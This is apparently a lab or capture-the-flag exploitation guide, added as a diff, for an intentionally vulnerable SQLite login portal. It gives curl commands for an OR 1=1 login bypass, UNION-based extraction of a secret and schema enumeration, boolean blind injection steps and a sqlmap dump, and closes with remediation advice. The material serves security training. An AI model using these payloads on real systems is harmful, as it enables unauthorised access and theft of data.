@@ -1,0 +1,143 @@
+# Exploitation Guide — SQL Injection (Login Portal)
+# =============================================================================
+#
+# Background
+# ----------
+# The login form passes the password field directly into a SQLite query
+# via Python f-string concatenation. The username field is parameterised safely.
+#
+#   WHERE username = ? AND password = '{password}'
+#
+#   DIFFICULTY=easy  → DB errors shown in the response (error-based SQLi)
+#   DIFFICULTY=hard  → all errors return "Invalid credentials" (blind SQLi)
+#
+# The flag is stored as admin's secret in the secrets table.
+#
+# Assumptions
+# -----------
+#   TARGET_IP  = IP address of the vulnerable VM
+#   PORT       = the port the app listens on (set at build time)
+#   DIFFICULTY = easy | hard
+#
+# =============================================================================
+
+
+# =============================================================================
+# STEP 1 — Confirm the app is running
+# =============================================================================
+
+curl -s -o /dev/null -w "%{http_code}" http://TARGET_IP:PORT/
+# Expected: 200
+# Open in a browser: http://TARGET_IP:PORT/ — login page with APP_TITLE heading.
+
+
+# =============================================================================
+# STEP 2 — Confirm the injectable field (DIFFICULTY=easy)
+# =============================================================================
+# Send a single quote in the password field. On easy difficulty a DB syntax
+# error is returned — confirming the password field is unsanitised.
+
+curl -s -X POST http://TARGET_IP:PORT/ \
+  -d "username=admin&password='" | grep -o 'DB error.*'
+# Expected: DB error: unrecognized token: ...
+
+# On DIFFICULTY=hard this returns "Invalid credentials" instead.
+# Use the boolean method in STEP 6 to confirm injection without error output.
+
+
+# =============================================================================
+# STEP 3 — Login bypass
+# =============================================================================
+# Inject into the password field. The payload closes the string, adds OR 1=1,
+# then comments out the rest of the query — making it always true.
+#
+# Resulting query:
+#   WHERE username = ? AND password = '' OR '1'='1'-- '
+
+curl -s -X POST http://TARGET_IP:PORT/ \
+  -d "username=admin&password='+OR+'1'='1'--+" \
+  -c /tmp/cookies.txt -D - | grep -E "HTTP|Location"
+# Expected: HTTP/1.0 302 FOUND → Location: /dashboard
+
+# Fetch the dashboard with the saved session cookie:
+curl -s http://TARGET_IP:PORT/dashboard -b /tmp/cookies.txt | grep -o 'FLAG{[^<]*}'
+# Expected: FLAG{...}
+
+
+# =============================================================================
+# STEP 4 — UNION-based extraction (no session required)
+# =============================================================================
+# The original SELECT returns 3 columns: id, username, role.
+# Inject a UNION via the password field that reads admin's secret directly
+# into the username column.
+
+curl -s -X POST http://TARGET_IP:PORT/ \
+  -d "username=x&password=%27+UNION+SELECT+secret%2Csecret%2Csecret+FROM+secrets+WHERE+owner%3D%27admin%27--+" \
+  -c /tmp/cookies2.txt -D - | grep "Location"
+curl -s http://TARGET_IP:PORT/dashboard -b /tmp/cookies2.txt | grep -o 'FLAG{[^<]*}'
+
+
+# =============================================================================
+# STEP 5 — Schema enumeration
+# =============================================================================
+# List all tables:
+curl -s -X POST http://TARGET_IP:PORT/ \
+  -d "username=x&password=%27+UNION+SELECT+name%2Cname%2Cname+FROM+sqlite_master+WHERE+type%3D%27table%27--+" \
+  -c /tmp/c.txt -D - | grep Location
+curl -s http://TARGET_IP:PORT/dashboard -b /tmp/c.txt | grep -o 'Welcome,[^<]*'
+# Expected: Welcome, users  (run again to get secrets)
+
+# Read column definitions of secrets table:
+curl -s -X POST http://TARGET_IP:PORT/ \
+  -d "username=x&password=%27+UNION+SELECT+sql%2Csql%2Csql+FROM+sqlite_master+WHERE+name%3D%27secrets%27--+" \
+  -c /tmp/c2.txt -D - | grep Location
+curl -s http://TARGET_IP:PORT/dashboard -b /tmp/c2.txt | grep -o 'Welcome,[^<]*'
+
+
+# =============================================================================
+# STEP 6 — Blind SQLi (DIFFICULTY=hard, boolean-based)
+# =============================================================================
+# No error messages are returned. Determine if an injection point exists by
+# observing whether the login succeeds or fails with different payloads.
+
+# TRUE condition → login succeeds (302 redirect):
+curl -s -X POST http://TARGET_IP:PORT/ \
+  -d "username=admin&password='+AND+'1'='1'--+" \
+  -D - | grep "HTTP"
+# Expected: 302 FOUND
+
+# FALSE condition → login fails (200, form re-displayed):
+curl -s -X POST http://TARGET_IP:PORT/ \
+  -d "username=admin&password='+AND+'1'='2'--+" \
+  -D - | grep "HTTP"
+# Expected: 200 OK
+
+# The difference in response code confirms injection and allows boolean inference.
+# Use sqlmap to automate data extraction (see STEP 7).
+
+
+# =============================================================================
+# STEP 7 — Automated exploitation with sqlmap
+# =============================================================================
+
+sqlmap -u "http://TARGET_IP:PORT/" \
+  --data="username=admin&password=pass" \
+  --level=2 --risk=1 \
+  --dbms=sqlite \
+  --dump
+
+# sqlmap detects the injection point automatically, enumerates tables,
+# and dumps all rows including the flag in the secrets table.
+# On DIFFICULTY=hard, add --technique=B (boolean-based blind only).
+
+
+# =============================================================================
+# Remediation (for reference)
+# =============================================================================
+# - Use parameterised queries for ALL user input — never f-strings or %:
+#     c.execute("SELECT id, username, role FROM users
+#                WHERE username = ? AND password = ?", (username, password))
+# - Hash passwords with bcrypt or argon2id — plain-text is exposed by any dump
+# - Least privilege: DB connection should not have access to sqlite_master
+#   (not enforceable in SQLite — use PostgreSQL/MySQL for stricter ACLs)
+# - Input validation as defence-in-depth: reject ' " ; -- at the boundary
